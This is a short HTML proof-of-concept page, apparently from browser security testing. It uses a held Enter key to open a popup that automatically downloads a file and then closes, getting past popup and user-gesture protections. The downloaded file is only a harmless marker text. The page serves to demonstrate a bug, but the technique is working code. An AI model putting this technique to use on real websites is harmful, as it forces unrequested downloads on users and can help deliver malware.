<!DOCTYPE html>
<html>

<head>
    <title>Site A</title>
    <style>
        body {
            background-color: #ffebee;
        }
    </style>
</head>

<body>
    <h3>Situs A (Origin 1)</h3>
    <button id="targetBtn">Click this button, then PRESS and HOLD "Enter"</button>
    <script>
        document.addEventListener("keydown", (e) => {
            if (e.key === "Enter") {
                console.log("Attempting Popup Escape...");
                const popup = window.open("", "_blank", "width=200,height=200");
                if (popup) {
                    popup.document.write(`
                <h1>Downloading...</h1>
                <script>
                    const a = document.createElement("a");
                    a.href = "data:text/plain;base64,UE9DIC0gUG9wdXAgRXNjYXBl";
                    a.download = "popup_bypass.txt";
                    document.body.appendChild(a);
                    a.click();
                    // Tutup popup setelah download dipicu
                    setTimeout(() => { window.close(); }, 1000);
                <\/script>
            `);
                } else {
                    console.error("Popup blocked! User gesture might be too weak or persistent.");
                }
            }
        });
    </script>
</body>

</html>
